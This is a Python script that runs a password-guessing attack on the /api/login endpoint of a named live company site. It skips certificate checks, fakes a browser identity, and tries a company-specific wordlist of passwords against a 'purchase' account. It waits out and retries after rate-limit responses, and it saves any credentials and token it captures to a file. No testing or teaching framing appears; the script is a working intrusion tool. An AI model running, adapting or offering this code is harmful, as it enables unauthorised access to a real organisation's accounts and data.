import http.client, ssl, json, sys, time
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
H={'Host':'zt.lubon.com','Content-Type':'application/json','Accept':'application/json','User-Agent':'Mozilla/5.0 Chrome/125'}
USERS=['root','admin','finance','manager','purchase','warehouse','investor','board','qc','plan','production','marketing','service','aftersale','support']
PWS=['Lbtek@2020','Lbtek@2021','Lbtek@2022','Lubon@2020','Lubon@2021','Lubon@2022','Lubon@2023','Lubon@2024','Lubon@2025','Lubon@2026',
 'Lbtek@888','Lbtek@999','Lbtek@666','lbtek2020','lbtek2021','lbtek2022','lbtek2023','lbtek2024','lbtek2025','lbtek2026',
 'lubon2020','lubon2021','lubon2022','lubon2023','lubon2024','Aa123456','Aa123456!','Admin@1234','Password123','Qwer1234',
 '1qaz2wsx','P@ssw0rd','Welcome1','073184165699','4000606986','hanz520@123','569691266','Lbtek@#123','LBTEK@2026','LUBON@2026',
 'admin123','admin888','admin@888','root123','root888','root@888','123456789','1234567890','123456a','qwerty123','abc123456','Lbtek!@#$','lbteklubon','lubonlbtek',
 'Lubon@111','Lubon@222','Lubon@333','Lubon@999','Lbtek@111','lbtek@888','lubon@888','Lbtek2023!','Lubon2023!','admin@lbtek','root@lbtek','finance@lbtek','manager@lbtek','lbtek@2020','lbtek@2021','lbtek@2022','lbtek@2023','lbtek@2024','lbtek@2025','lbtek@2026','lubon2025','lubon2026','Lubon2024!','Lbtek2024!']
USERS_PW = [p for p in PWS if len(p)>=6]
sel = 'purchase'
U = USERS[int(sel)] if sel.isdigit() else sel
n=0; hit=False
for p in USERS_PW:
    c=http.client.HTTPSConnection('zt.lubon.com',443,context=ctx,timeout=20)
    try:
        c.request('POST','/api/login',body=json.dumps({'name':U,'pwd':p}),headers=H)
        r=c.getresponse(); d=r.read().decode('utf8','replace'); c.close()
    except Exception:
        try:c.close()
        except:pass
        continue
    n+=1
    if 'Too Many' in d:
        print('[%s %d] LIMIT, sleep 40'%(U,n),flush=True); time.sleep(40)
        # 重试同一密码
        c=http.client.HTTPSConnection('zt.lubon.com',443,context=ctx,timeout=20)
        try:
            c.request('POST','/api/login',body=json.dumps({'name':U,'pwd':p}),headers=H)
            r=c.getresponse(); d=r.read().decode('utf8','replace'); c.close()
        except Exception:
            try:c.close()
            except:pass
            continue
    if 'token' in d.lower() and '"code":401' not in d and 'pwd 至少' not in d and 'Too Many' not in d:
        print('★★★ HIT user=%s pw=%s resp=%s'%(U,p,d[:400]),flush=True)
        open('/tmp/HIT_%s.txt'%U,'w').write(U+'\n'+p+'\n'+d); hit=True; break
    if n%10==0: print('[%s %d/%d] %s'%(U,n,len(USERS_PW),p),flush=True)
    time.sleep(0.7)
print('[%s] DONE n=%d hit=%s'%(U,n,hit),flush=True)
